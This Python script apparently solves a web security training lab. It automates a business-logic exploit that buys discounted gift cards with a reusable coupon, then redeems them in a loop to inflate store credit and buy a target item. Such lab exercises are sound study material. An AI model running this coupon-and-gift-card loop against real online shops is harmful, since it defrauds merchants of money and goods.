### From a certain point onwards, the script will not work anymore. ###

from lxml import html
import requests
from rich.console import Console
from rich.progress import track

SERVER = "https://0ada005b044d1a8c82463323002e00d0.web-security-academy.net/"
COUPON = "SIGNUP30"
gift_cards_csrf_token = None
cart_csrf_token = None

session = requests.session()
console = Console()

def get_csrf_token(endpoint):
    page = session.get(f"{SERVER}/{endpoint}")
    csrf_token = html.fromstring(page.content).xpath('//input[@name="csrf"]/@value')[0]
    return csrf_token


def do_login(username, password):
    csrf_token = get_csrf_token("login")
    response = session.post(f"{SERVER}/login", data={"csrf":csrf_token, "username":username, "password":password})
    return response.status_code


def get_store_credit():
    response = session.get(SERVER)
    strong = html.fromstring(response.content).xpath('//strong')[0].text
    store_credit = strong.split("$")[-1]
    return float(store_credit)
    

def add_gift_cards_to_cart(number_of_gift_cards):
    session.post(f"{SERVER}/cart", data={"productId":2, "redir":"PRODUCT", "quantity":number_of_gift_cards})
    

def add_coupon():
    global cart_csrf_token
    if not cart_csrf_token:
        cart_csrf_token = get_csrf_token("/cart")
    session.post(f"{SERVER}/cart/coupon", data={"csrf":cart_csrf_token,"coupon":"SIGNUP30"})


def checkout():
    global cart_csrf_token
    if not cart_csrf_token:
        cart_csrf_token = get_csrf_token("/cart")
    return session.post(f"{SERVER}/cart/checkout", data={"csrf":cart_csrf_token})


def get_gift_cards_list(response, number_of_gift_cards):
    return [elem.text for elem in html.fromstring(response.content).xpath('//table[@class="is-table-numbers"]//td')][:number_of_gift_cards]


def redeem_gift_cards(gift_cards):   
    global gift_cards_csrf_token
    if not gift_cards_csrf_token:
        gift_cards_csrf_token = get_csrf_token("my-account")
    

    for gift_card in gift_cards:
        console.log(f"Gift card: {gift_card}")
        console.log(session.post(f"{SERVER}/gift-card", data={"csrf":gift_cards_csrf_token, "gift-card":gift_card}).status_code)


def add_leet_jacket():
    session.post(f"{SERVER}/cart", data={"productId":1, "redir":"PRODUCT", "quantity":1})

with console.status("Logging in"):
    response = do_login("wiener","peter")

store_credit = get_store_credit()
while store_credit < 1337.0*0.7:
    number_of_gift_cards = min(99, int(store_credit // (10*0.7)))  # Each gift card costs $10 - 30% discount
    console.log(f"Number of gift cards: {number_of_gift_cards}")
    with console.status("Buying gift cards"):
        add_gift_cards_to_cart(number_of_gift_cards)
        add_coupon()
        response = checkout()
        gift_cards = get_gift_cards_list(response, number_of_gift_cards)
    
    with console.status("Reedeeming gift cards"):
        redeem_gift_cards(gift_cards)

    with console.status("Fetching store credit"):
        store_credit = get_store_credit()
        console.log(f"Store credit: {store_credit}")


# Buy l33t jacket
with console.status("Buying leet jacket"):
    add_leet_jacket()
    add_coupon()
    checkout()